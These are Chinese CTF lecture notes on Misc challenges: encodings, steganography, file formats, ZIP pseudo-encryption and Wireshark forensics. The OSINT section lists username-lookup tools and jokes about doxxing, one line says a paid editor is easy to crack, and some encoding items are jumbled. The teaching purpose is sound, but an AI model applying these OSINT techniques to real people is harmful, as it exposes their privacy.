<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 6316 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 9 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 11 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 22 分钟</p>
</div>
<h2 id="note-ctf-misc-7-4-lec3-misc">7-4 lec3-Misc<a class="headerlink" href="#note-ctf-misc-7-4-lec3-misc" title="Permanent link">&para;</a></h2>
<blockquote>
<p>授课：goduck </p>
</blockquote>
<h3 id="note-ctf-misc-misc">什么是Misc<a class="headerlink" href="#note-ctf-misc-misc" title="Permanent link">&para;</a></h3>
<ul>
<li>杂项 ALL-PWN-WEB-CRYPTO - REVERSE</li>
<li>隐写、取证、OSINT（信息搜集）、PPC（编程类） ——传统 misc 题</li>
<li>游戏类题目（大概也算 PPC）、工具运用类题目</li>
<li>编解码、古典密码 ——不那么 crypto 的 crypto</li>
<li>网络解谜、网站代码审计 ——不那么 web 的 web</li>
<li>代码审计、沙箱逃逸 ——不那么 binary 的 binary</li>
<li>Blockchain、IoT、AI ——新兴类别题目</li>
</ul>
<h3 id="note-ctf-misc-_1">编码基础<a class="headerlink" href="#note-ctf-misc-_1" title="Permanent link">&para;</a></h3>
<ul>
<li>一切信息在计算机看来都是 0 和 1<ul>
<li>编解码 / 加解密 / 哈希都是在 01 串之间进行的变换</li>
</ul>
</li>
<li>为什么你看见的输入输出是字符？<ul>
<li>计算机通过字符编码规则将 01 串转换为了可见字符</li>
</ul>
</li>
<li>三种常见的01串转换方式
    <img alt="" src="../NOTE/CTF/img/01trans.png" />  <ul>
<li>常用的解码工具<a href="https://lab.tonycrane.cc/CyberChef/"> <strong>CyperChef</strong> </a></li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-_2">为什么会乱码<a class="headerlink" href="#note-ctf-misc-_2" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p>字符编码：人类理解的字符 &gt; 计算机理解的 01 串 之间的映射</p>
</li>
<li>
<p>为什么会出现乱码：用一种字符编码规则解读另一种字符编码的 01 串
；A0-FF：可见字符</p>
<ul>
<li>特点：任何字节流都可以用其解码</li>
</ul>
</li>
<li>利用 Unicode 字符集的</li>
<li>常见的字符编码：</li>
<li>ASCII：一共 128 个项，即每个字符可以用一个 7 位的 01 串表示（或一字节）<ul>
<li>00-1F：控制字符；20-7E：可见字符；7F：控制字符（DEL）</li>
</ul>
</li>
<li>Latin-1（ISO-8859-1）：扩展了 ASCII，一共 256 个项<ul>
<li>80-9F：控制字符一系列编码</li>
<li>UTF-8 / UTF-16 / UTF-32 / UCS</li>
</ul>
</li>
<li>中国国标字符集系列编码<ul>
<li>GB 2312 / GBK / GB 18030-2022</li>
</ul>
</li>
</ul>
<h5 id="note-ctf-misc-_3">怎么就乱码了<a class="headerlink" href="#note-ctf-misc-_3" title="Permanent link">&para;</a></h5>
<p>几个字符集不兼容的部分互相编解码，常见的：</p>
<ul>
<li>用 GBK 解码 UTF-8 编码的文本</li>
<li>用 UTF-8 解码 GBK 编码的文本</li>
<li>用 latin-1 解码 UTF-8 编码的文本</li>
<li>用 latin-1 解码 GBK 编码的文本</li>
<li>先用 GBK 解码 UTF-8 编码的文本，再用 UTF-8 解码前面的结果</li>
<li>先用 UTF-8 解码 GBK 编码的文本，再用 GBK 解码前面的结果</li>
<li>这里我们请同学们自行研究，lab 中会用到（后续详细发布），几种推荐的方式：</li>
<li>CyberChef，通过 Input 和 Output 窗口的字符集设置</li>
<li>需要注意，CyberChef 的 UTF-8 不会将错误解码替换为 �（非预期）</li>
<li>vscode 右下角的编码方案（重新打开 / 用编码保存）</li>
<li>必要的时候可以使用 python 来进行编解码 / 进制转换等</li>
</ul>
<h4 id="note-ctf-misc-_4">摩斯电码<a class="headerlink" href="#note-ctf-misc-_4" title="Permanent link">&para;</a></h4>
<p>前面说到的字符编码：01 串 &gt; 字符；接下来看另一种：字符 &gt; 字符</p>
<ul>
<li>摩尔斯电码（Morse Code）：利用点划（“滴”的时间长短）来表示字符<ul>
<li>点 ·：1 单位；划 -：3 单位</li>
<li>点划之间间隔：1 单位；字符之间间隔：3 单位；单词之间间隔：7 单位</li>
</ul>
</li>
<li>字符集：A-Z、0-9、标点符号（.:,; ='/!-_"()$&amp;@+）、一些电码专用表示</li>
<li>表示中文：电码表（一个汉字对应四个数字），数字使用短码发送
    <img alt="" src="../NOTE/CTF/img/morse.png" /></li>
</ul>
<h4 id="note-ctf-misc-base">BASE编码<a class="headerlink" href="#note-ctf-misc-base" title="Permanent link">&para;</a></h4>
<ul>
<li>Base16：即 16 进制表示字节流，长度翻倍</li>
<li>Base32：按照 5 bit 一组（每个 0-31），按照字符表（A-Z2-7）映射<ul>
<li>结果长度必须是 5 的倍数，不足的用 = 不齐（明显特征）</li>
</ul>
</li>
<li>Base64：按照 6 bit 一组，按照字符表映射（最常用）<ul>
<li>标准字符表：A-Za-z0-9+/</li>
<li>另有多种常用字符表，如 URL 安全字符表：A-Za-z0-9-_</li>
<li>结果长度必须是 4 的倍数，不足的用 = 不齐（1~2 个，明显特征）  </li>
</ul>
</li>
</ul>
<h5 id="note-ctf-misc-base-n">Base-n 系列的本质：<a class="headerlink" href="#note-ctf-misc-base-n" title="Permanent link">&para;</a></h5>
<ul>
<li>字节流 &gt; 整数 &gt; n 进制 &gt; 系数查表
  所以除去前面规则的 16/32/64 进制，还有一些其他的 Base 编码：</li>
<li>分组：<ul>
<li>Base85：4 字节整数 &gt; 85 进制 &gt; 5 个系数</li>
<li>常用字符表：0-9A-Za-z!#$%&amp;()*+-; &gt;?@^_`{ }~</li>
<li>标准字符表：!-u（ASCII 编码中 0x21-0x75）</li>
<li>作为大整数转换进制：</li>
<li>Base62：0-9A-Za-z（比 Base64 少了 +/）</li>
<li>Base58：0-9A-Za-z 去除 0OIl</li>
<li>Base56：比 Base58 少了 1 和 o</li>
<li>Base36：0-9A-Z（比 Base62 少了 a-z）</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-misc-osint">OSINT 基础<a class="headerlink" href="#note-ctf-misc-osint" title="Permanent link">&para;</a></h3>
<blockquote>
<p>我要成为开盒糕手！</p>
</blockquote>
<ul>
<li>Open Source INTelligence：开源网络情报</li>
</ul>
<p>通过完全公开的信息进行合理的推理，获取情报
一般在 misc 题目中出现即泛指信息搜集，有几种情况：
- 构造了一个全新的虚拟身份，搜集得到出题人准备好的信息
- 根据图片、文档等附件泄漏的信息进行推理（主要）
- 包括根据图片内容推理找到拍摄位置、当时环境等信息</p>
<h4 id="note-ctf-misc-_5">信息搜集<a class="headerlink" href="#note-ctf-misc-_5" title="Permanent link">&para;</a></h4>
<ul>
<li><a href="https:/github.com/ffffffff0x/Digital-Privacy">数字信息搜集工具</a></li>
<li>用户名批量查询</li>
<li><a href="https:/github.com/sherlock-project/sherlock">sherlock</a> </li>
<li><a href="https:/namechk.com/">namechk</a></li>
</ul>
<h4 id="note-ctf-misc-_6">文件信息泄露<a class="headerlink" href="#note-ctf-misc-_6" title="Permanent link">&para;</a></h4>
<ul>
<li>各种文档的元信息（metadata）可能包括作者、修改时间等信息<ul>
<li>图片的 EXIF 信息，可通过 exiftool 查看一般以 xml 形式存储，可以直接通过二进制抹除，或者通过操作系统</li>
</ul>
</li>
<li>工程文件夹泄漏信息<ul>
<li>Visual Studio 的各种配置文件，.vs 文件夹中信息</li>
<li>.vscode 文件夹中的配置文件</li>
<li>.git 文件夹，泄漏全部修改历史、提交信息、提交者等
文件夹路径信息泄漏</li>
<li>.DS_Store 文件，macOS 下的文件夹布局信息</li>
</ul>
</li>
</ul>
<p>前面各种工程配置文件等也会泄漏（比如 vs 的 pdb 调试信息）
markdown 文件图片路径（本地路径 / 图床用户 / 自建图床网站）   </p>
<h4 id="note-ctf-misc-_7">照片信息分析<a class="headerlink" href="#note-ctf-misc-_7" title="Permanent link">&para;</a></h4>
<ul>
<li>识图</li>
<li>属性</li>
<li>地标</li>
<li>天气信息，云层信息，估计方向，位置，时间等</li>
<li>风景信息，Yandex搜索</li>
</ul>
<h2 id="note-ctf-misc-7-9-misc1">7-9 Misc专题1<a class="headerlink" href="#note-ctf-misc-7-9-misc1" title="Permanent link">&para;</a></h2>
<blockquote>
<p>授课: 45gfg9 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M50.7 58.5 0 160h208V32H93.7c-18.2 0-34.8 10.3-43 26.5M240 160h208L397.3 58.5c-8.2-16.2-24.8-26.5-43-26.5H240zm208 32H0v224c0 35.3 28.7 64 64 64h320c35.3 0 64-28.7 64-64z"/></svg></span></p>
<p>长沙，好玩；上课，不好玩</p>
</blockquote>
<h3 id="note-ctf-misc-part1">Part1:文件系统基础<a class="headerlink" href="#note-ctf-misc-part1" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-misc-_8">文件如何存储<a class="headerlink" href="#note-ctf-misc-_8" title="Permanent link">&para;</a></h4>
<ul>
<li>不同的文件系统，不同的组织方式<ul>
<li>MS 派：FAT、NTFS、exFAT、ReFS</li>
<li>Apple 派：HFS、APFS</li>
<li>Linux 派：ext[234]、XFS、Btrfs、ZFS...</li>
</ul>
</li>
<li>文件是一串二进制数据<ul>
<li>在 HDD 上是微小磁极的磁化方向</li>
<li>在 SSD 上是电荷的存储状态</li>
</ul>
</li>
<li>“文件名”是由文件系统管理的，不是文件本身数据的一部分<ul>
<li>文件系统会记录文件名、文件大小、创建时间、修改时间等信息</li>
<li>文件内容才是真正的数据</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-_9">如何判断文件类型<a class="headerlink" href="#note-ctf-misc-_9" title="Permanent link">&para;</a></h4>
<ul>
<li>扩展名<ul>
<li>.jpg  , .webp,.txt,.docx</li>
<li>是文件名的一部分，可以随意修改</li>
<li>决定了打开文件的默认程序</li>
</ul>
</li>
<li>内容<ul>
<li>通过文件内容来识别文件类型</li>
<li><code>file</code> 命令</li>
<li>不同文件类型有不同的magic number</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-_10">二进制查看文件与分析<a class="headerlink" href="#note-ctf-misc-_10" title="Permanent link">&para;</a></h4>
<ul>
<li>010 Editor<ul>
<li>全平台最常用的二进制编辑器，付费软件（但容易破解）</li>
<li>有丰富的 binary templates，支持解析多种文件格式</li>
</ul>
</li>
<li>wader/fg<ul>
<li>Go 编写的开源二进制文件查看工具</li>
<li>支持类似 jq 语法的查询</li>
</ul>
</li>
<li>Hex Fiend<ul>
<li>macOS 上免费开源高效的二进制编辑器</li>
<li>也有多种二进制格式的解析模板，但显示没有 010 丰富</li>
</ul>
</li>
<li>ImHex<ul>
<li>全平台开源二进制编辑器</li>
<li>类似 010 Editor，但使用麻烦一些</li>
<li>可以编写自定义解析模板</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-_11">文件类型检测与元信息<a class="headerlink" href="#note-ctf-misc-_11" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../NOTE/CTF/img/magic_num.png" /></p>
<h4 id="note-ctf-misc-_12">文件附加内容的识别与分离<a class="headerlink" href="#note-ctf-misc-_12" title="Permanent link">&para;</a></h4>
<ul>
<li>大部分文件类型都有一个标记文件内容结束的标志</li>
<li>
<p>比如 PNG 的 IEND 块、JPEG 的 EOI 标志（FF D9）</p>
</li>
<li>
<p>所以一般在文件末尾添加其他字节时，不会影响原文件本身的用途</p>
</li>
<li>因此有些隐写是将数据隐藏在文件末尾达到的</li>
<li>或者在文件后叠加另一份文件</li>
<li>cat cover.jpg secret.zip &gt; cover_stego.jpg</li>
<li>附加内容的识别</li>
<li>exiftool 一般可以识别图像文件后的附加数据</li>
<li>binwalk 可以检测叠加的文件</li>
<li>附加文件的分离</li>
<li>binwalk 或 foremost 识别并分离</li>
<li>dd if=<src> of=<dst> bs=1 skip=<offset> 手动分离</li>
</ul>
<h3 id="note-ctf-misc-part2">Part2: 图像隐写基础技术<a class="headerlink" href="#note-ctf-misc-part2" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-misc-_13">文件内容基本隐写<a class="headerlink" href="#note-ctf-misc-_13" title="Permanent link">&para;</a></h4>
<ul>
<li>文件末尾添加数据<ul>
<li>exiftool 识别短数据，或者十六进制编辑器直接观察</li>
<li>binwalk 识别叠加文件，foremost 提取</li>
<li>图像末尾叠加一个压缩包，就是所谓的“图种”<ul>
<li>修改后缀名可能可以解压（部分解压软件会忽略前面的图像）</li>
<li>其实不如直接分离</li>
</ul>
</li>
</ul>
</li>
<li>直接利用元信息<ul>
<li>exiftool 即可读取</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-_14">色彩空间、色彩模式<a class="headerlink" href="#note-ctf-misc-_14" title="Permanent link">&para;</a></h4>
<p>色彩空间（sRGB、Adobe RGB、Display P3 等）是一个相对非常复杂的概念，而且是针对显示的，我们不详细介绍</p>
<p>我们注重于表示颜色的数据上，一般称为色彩模式（color mode）：</p>
<ul>
<li>二值图像（bitonal）：每个像素只有两种颜色，如黑白</li>
<li>灰度图像（grayscale）：每个像素有多种灰度，如 256 级灰度</li>
<li>RGB(A)：3(+1) 通道，表示 RGB 三种颜色，A 表示透明度通道(印刷常用)</li>
<li>CMYK：青 cyan、品红 magenta、黄 yellow、黑 black 四种颜色混合</li>
<li>HSV：色调 hue、饱和度 saturation、明度 value</li>
<li>HSL：色调 hue、饱和度 saturation、亮度 lightness</li>
<li>YCbCr：亮度 luminance、蓝色色度 blue chroma、红色色度 red chroma</li>
<li>LAB：亮度 lightness、绿红色度 A、蓝黄色度 B</li>
<li>...</li>
</ul>
<h4 id="note-ctf-misc-lsb">LSB 隐写<a class="headerlink" href="#note-ctf-misc-lsb" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../NOTE/CTF/img/LSB.png" /></p>
<ul>
<li>人眼对于微小的颜色变化不敏感</li>
<li>对于 8 bit 的颜色值，最低位的变化不会被察觉</li>
<li>可以随意修改最低位，而不影响图像的显示效果</li>
<li>LSB 隐写将颜色通道的最低位用来编码信息</li>
<li>图像：stegsolve / CyberChef View Bit Plane</li>
<li>数据：stegsolve / CyberChef Extract LSB / zsteg / PIL</li>
</ul>
<h4 id="note-ctf-misc-pil">PIL 图像处理基础<a class="headerlink" href="#note-ctf-misc-pil" title="Permanent link">&para;</a></h4>
<p>PIL（Python Imaging Library）是 Python 中非常常用的图像处理库</p>
<ul>
<li>安装：pip3 install pillow 或 apt install python3-pil</li>
<li>
<p>官方文档 / 教程：<a href="https://pillow.readthedocs.io/en/stable/">https://pillow.readthedocs.io/en/stable/</a></p>
</li>
<li>
<p>基本用法</p>
<ul>
<li>from PIL import Image 导入和图像读写处理有关的 Image 类</li>
<li>img = Image.open(file_name) 打开图像</li>
<li>img.show() 显示图像；img.save(file_name) 保存图像</li>
<li>img.size 图像大小，img.mode 图像模式</li>
<li>img.convert(mode) 转换图像模式</li>
<li>img.getpixel((x, y)) 获取像素点颜色</li>
<li>img.putpixel((x, y), color) 设置像素点颜色</li>
<li>np.array(img) 将图像转换为 numpy 数组</li>
</ul>
</li>
<li>
<p>具体图像模式以及转换</p>
</li>
<li>'1'：黑白二值（0/255）；'L'：灰度（8 bit），'l'：32 bit 灰度<ul>
<li>L = 0.299 R + 0.587 G + 0.114 B</li>
</ul>
</li>
<li>'P'：8bit 调色盘，获取的像素值是调色盘索引</li>
<li>'RGB'、'RGBA'</li>
<li>'CMYK'：转换时有色差，CMY = 255 - RGB，K = 0</li>
<li>'YCbCr'、'LAB'、'HSV' 等，转换时有复杂公式（可能出现新的隐写）</li>
<li>PIL 其他模块用途<ul>
<li>ImageDraw 用于绘制图像、绘制图形</li>
<li>ImageChops 用于图像通道的逻辑运算</li>
<li>ImageOps 用于图像整体的运算一类</li>
<li>ImageFilter 用于图像的滤波处理</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-misc-part3">Part3:图像格式介绍<a class="headerlink" href="#note-ctf-misc-part3" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-misc-_15">图像存储<a class="headerlink" href="#note-ctf-misc-_15" title="Permanent link">&para;</a></h4>
<ul>
<li>图像信息：宽高、色彩模式、色彩空间等</li>
<li>EXIF 信息：拍摄设备、拍摄时间、GPS 信息等</li>
<li>像素数据：每个像素的颜色信息；二值、灰度、RGB、CMYK、调色盘等<ul>
<li>对于标准 RGB 图像，每个像素需要 24 bits(RGB三个字节，可能有A)</li>
<li>对于一张 1080p 图像，需要 6.22 MB(RGB)，4K 则需要 24.88 MB(RGBA)</li>
<li>BMP 格式</li>
</ul>
</li>
<li>压力给到了图像格式的压缩算法<ul>
<li>PNG 无损，JPEG 有损</li>
<li>GIF 有损且只支持 256 色</li>
<li>新兴格式如 HEIF、WebP、AVIF 等</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-jpeg">JPEG 文件格式<a class="headerlink" href="#note-ctf-misc-jpeg" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../NOTE/CTF/img/JPEG.png" /></p>
<p>JPEG 使用分段的结构来进行存储，各段以 0xFF 开头，后接一个字节表示类型：</p>
<ul>
<li>FFD8（SOI）：文件开始</li>
<li>FFE0（APP0）：应用程序数据段，包含文件格式信息（上图没有）</li>
<li>FFE1（APP1）：应用程序数据段，包含 EXIF 信息（上图没有）</li>
<li>FFDB（DQT）：量化表数据</li>
<li>FFC0（SOF）：帧数据，包含图像宽高、色彩模式等信息</li>
<li>FFC4（DHT）：huffman 表数据</li>
<li>FFDA（SOS）：扫描数据，包含数据的扫描方式，huffman 表的使用方式等</li>
<li>FFD9（EOI）：文件结束</li>
</ul>
<p>#### JPEG压缩原理
- JPEG 的压缩原理是 DCT（离散余弦变换）+ Huffman 编码
    + 由 RGB 转换到 YCbCr，然后减少 Cb、Cr 的采样率
    + 将图像分块，每个块 8x8，进行 DCT 变换
       - 将图像转换为频域，便于压缩高频部分
- 量化，将 DCT 变换后的系数除以量化表中的系数
    + 再次减少高频部分的数据
    + 根据不同的量化表，可以调整压缩质量
- 通过游程编码和 huffman 编码进行压缩</p>
<h4 id="note-ctf-misc-png">PNG文件格式<a class="headerlink" href="#note-ctf-misc-png" title="Permanent link">&para;</a></h4>
<p><img alt="" src="../NOTE/CTF/img/PNG.png" /></p>
<ul>
<li>文件头 89 50 4E 47 0D 0A 1A 0A | .PNG....</li>
<li>采用分块的方式存储数据<ul>
<li>每块的结构都是 4 字节长度 + 4 字节类型 + 数据 + 4 字节 CRC 校验</li>
<li>四个标准数据块：IHDR、PLTE、IDAT、IEND</li>
<li>其他辅助数据块：eXIf、tEXt、zTXt、tIME、gAMA……<ul>
<li>eXIf 元信息，tIME 修改时间，tEXt 文本，zTXt 压缩文本</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>四种标准数据块：</p>
<ul>
<li>IHDR：包含图像基本信息，必须位于开头<ul>
<li>4 字节宽度 + 4 字节高度</li>
<li>1 字节位深度：1、2、4、8、16</li>
<li>1 字节颜色类型：0 灰度，2 RGB，3 索引，4 灰度透明，6 RGB 透明</li>
<li>1 字节压缩方式，1 字节滤波方式，均固定为 0</li>
<li>1 字节扫描方式：0 非隔行扫描，1 Adam7 隔行扫描</li>
</ul>
</li>
<li>PLTE：调色板，只对索引颜色类型有用</li>
<li>IDAT：图像数据，可以有多个，每个数据块最大 2 31 -1 字节</li>
<li>IEND：文件结束标志，必须位于最后，内容固定<ul>
<li>PNG 标准不允许 IEND 之后有数据块</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-png_1">PNG压缩原理<a class="headerlink" href="#note-ctf-misc-png_1" title="Permanent link">&para;</a></h4>
<ul>
<li>PNG 使用 Deflate 压缩算法<ul>
<li>是 LZ77 结合 huffman 编码的一种压缩算法</li>
<li>LZ77：利用滑动窗口，找到最长的重复字符串，用指针和长度表示
 <img alt="" src="../NOTE/CTF/img/LZ77.png" /></li>
</ul>
</li>
<li>会进行滤波，减少数据的冗余性，提高压缩率<ul>
<li>五种滤波器：None、Sub、Up、Average、Paeth</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-misc-part4">Part4:隐写进阶技术<a class="headerlink" href="#note-ctf-misc-part4" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-misc-_16">图像大小修改<a class="headerlink" href="#note-ctf-misc-_16" title="Permanent link">&para;</a></h4>
<ul>
<li>PNG 图像按行进行像素数据的压缩，以及存储 / 读取</li>
<li>当解码时已经达到了 IHDR 中规定的大小就会结束</li>
<li>因此题目可能会故意修改 IHDR 中的高度数据，使之显示不全</li>
<li>恢复的话更改高度即可，同时注意 crc 校验码，否则可能报错<ul>
<li>binascii.crc32(data)，data 为从 IHDR 开始的数据</li>
</ul>
</li>
<li><img alt="" src="../NOTE/CTF/img/demo.png" />   </li>
</ul>
<h4 id="note-ctf-misc-_17">需要原图的图像隐写<a class="headerlink" href="#note-ctf-misc-_17" title="Permanent link">&para;</a></h4>
<p>有些情况下的图像隐写需要原图才能解密，这时第一步一般是 OSINT 搜索原图</p>
<ul>
<li>使用识图工具进行搜索</li>
<li>一般需要搜原图的题题目描述会带有来源暗示之类的</li>
<li>
<p>多注意搜到的图像大小、质量，确保是真正的原图
接下来利用原图和隐写图像的差异进行分析</p>
</li>
<li>
<p>图像像素异或观察差异</p>
<ul>
<li>PIL 手动处理 / ImageChops.difference</li>
<li>stegsolve image combiner
盲水印系列</li>
</ul>
</li>
<li>给了打水印的代码的话直接尝试根据代码逆推即可</li>
<li>没有给代码的可能就是常见的现有盲水印工具</li>
<li>
<p><a href="https://github.com/guofei9987/blind_watermark">guofei9987/blind_watermark</a></p>
</li>
<li>
<p>工具steghide、stegoveritas、SilentEye</p>
</li>
</ul>
<h4 id="note-ctf-misc-_18">音频文件格式简介<a class="headerlink" href="#note-ctf-misc-_18" title="Permanent link">&para;</a></h4>
<p>音频类题目其实并不常出：</p>
<ul>
<li>mp3：有损压缩</li>
<li>具体格式不多介绍，遇到了基本上也就是声音本身的隐写</li>
<li>wav：无损无压缩（waveform）<ul>
<li>直接存储的是音频的波形数据，可操作性更高</li>
<li>文件结构也是分 chunk 的，有 RIFF、fmt、data 等</li>
<li>编码音频数据的 sample 也可以进行 LSB 隐写</li>
</ul>
</li>
<li>flac：无损压缩，如果出现可能考虑转换为 wav</li>
<li>使用 Python 的 soundfile / librosa 库进行音频处理</li>
<li>频谱隐写</li>
<li>音频叠加</li>
<li>如果可以找到原音频，或提供了原音频，可以进行比较</li>
<li>方法是在 Audition 中创建多轨会话<ul>
<li>将两个音频拖入两个轨道</li>
<li>效果 &gt; 匹配响度，将两条音轨的响度匹配</li>
<li>点进其中一条音轨，效果 &gt; 反相，将波形上下颠倒</li>
<li>两条音轨匹配上波形之后播放 / 混音，就能听到差异了</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-misc-misc_1">其他Misc题目<a class="headerlink" href="#note-ctf-misc-misc_1" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-misc-zip">ZIP伪加密<a class="headerlink" href="#note-ctf-misc-zip" title="Permanent link">&para;</a></h4>
<ul>
<li>ZIP 也使用分段的方式存储数据<ul>
<li>本地文件记录 50 4B 03 04，可以有多个</li>
<li>中央目录记录 50 4B 01 02，可以有多个</li>
<li>中央目录结束 50 4B 05 06</li>
</ul>
</li>
<li>在中央目录记录中有一个字段记录加密方式<ul>
<li>如果不为 0 表示有加密</li>
</ul>
</li>
<li>其他字段，如最小版本<ul>
<li>可能修改为一个不合法的值，无法用解压软件解压</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-ppc">沙箱逃逸和 PPC<a class="headerlink" href="#note-ctf-misc-ppc" title="Permanent link">&para;</a></h4>
<ul>
<li>沙箱：做了某些限制的隔离环境<ul>
<li>例如 Docker，或一个沙箱程序，如 rbash</li>
</ul>
</li>
<li>Python 解释器也可以作为一个沙箱<ul>
<li>通过限制模块、限制函数、代码审计等方式</li>
</ul>
</li>
<li>
<p>沙箱逃逸就是在沙箱中执行代码，获取到沙箱外的权限</p>
<ul>
<li>Python 的 os 及 importlib 模块是常见的逃逸点</li>
</ul>
</li>
<li>
<p>PPC 题较为不常见</p>
</li>
<li>一般是限制代码长度 / 汇编指令，要求实现某个功能</li>
</ul>
<h2 id="note-ctf-misc-7-9-misc2">7-9 Misc专题2<a class="headerlink" href="#note-ctf-misc-7-9-misc2" title="Permanent link">&para;</a></h2>
<blockquote>
<p>授课：TonyCrane</p>
</blockquote>
<h3 id="note-ctf-misc-part1_1">Part1:流量取证<a class="headerlink" href="#note-ctf-misc-part1_1" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-misc-_19">流量取证基础<a class="headerlink" href="#note-ctf-misc-_19" title="Permanent link">&para;</a></h4>
<ul>
<li>网络流量（ &gt; 回顾 web 基础）<ul>
<li>应用层（HTTP/FTP/ .） &gt; 表示层 &gt; 会话层（SSL/TLS/ .）</li>
<li>
<blockquote>
<p>传输层（TCP/UDP） &gt; 网络层（IP/ICMP/ .）</p>
</blockquote>
</li>
<li>
<blockquote>
<p>数据链路层 &gt; 物理层</p>
</blockquote>
</li>
</ul>
</li>
<li>最终传输的仍然是二进制数据<ul>
<li>捕获这些数据，就可以分析得到正在进行的通信内容</li>
</ul>
</li>
<li>流量取证一般就是拿到这些数据包（cap、pcap、pcapng 格式）进行分析<ul>
<li>如有损坏的话修复数据包（少见，pcapfix 可以修复）</li>
<li>分析、提取得到正在通信的内容（可能包含有效信息）</li>
<li>分析一些特定的、不太常见的协议（比如一些自定义协议）</li>
<li>分析、解密一些加密的协议（比如 VMess 等）</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-_20">流量取证常用工具<a class="headerlink" href="#note-ctf-misc-_20" title="Permanent link">&para;</a></h4>
<ul>
<li>tcpdump 抓 TCP 包（Linux 命令行）</li>
<li>Wireshark：直接抓包，得到物理层的全部数据并解析（开源）</li>
<li>自带命令行工具 tshark</li>
<li>termshark：类似 Wireshark 的开源命令行工具</li>
<li>pyshark：tshark 的 Python 封装，可以用 Python 脚本分析</li>
<li>scapy：Python 库，也可以用来分析流量包</li>
</ul>
<p><strong>Wireshark 基本用法</strong></p>
<ul>
<li>浏览主界面的所有数据包，大致了解都由什么协议组成</li>
<li>追踪流（追踪 TCP 流 / 追踪 HTTP 流）</li>
<li>得到某次通信的全部数据包，并进行解析</li>
<li>另存为，保存流数据</li>
<li>可以转换不同的显示形式（ASCII、HEX、Raw）</li>
<li>文件 &gt; 导出，提取某些数据包的流内容</li>
<li>统计部分<ul>
<li>协议层次：统计各层协议的数据包数量</li>
<li>流量图：统计各个端口的流量，可视化显示</li>
<li>HTTP：分组计数、请求统计</li>
</ul>
</li>
</ul>
<p><strong>Wireshark 过滤器</strong></p>
<ul>
<li>过滤协议：直接输入 tcp/udp/http 等</li>
<li>过滤 ip：ip.addr = xx.xx.xx.xx 或 ip.src ip.dst</li>
<li>过滤端口：tcp.port = 80 或 tcp.srcport tcp.dstport</li>
<li>包长度过滤：frame.len ip.len tcp.len ……</li>
<li>http 过滤<ul>
<li>http.request.method = GET</li>
<li>http.request.uri = "/index.php"</li>
<li>http contains "flag"（相当于搜索功能）</li>
</ul>
</li>
</ul>
<p><strong>HTTP协议流量分析</strong></p>
<ul>
<li>分析统计信息<ul>
<li>查看所有的 HTTP 请求 URI</li>
<li>分析 HTTP 往返的情况，流量整体信息</li>
</ul>
</li>
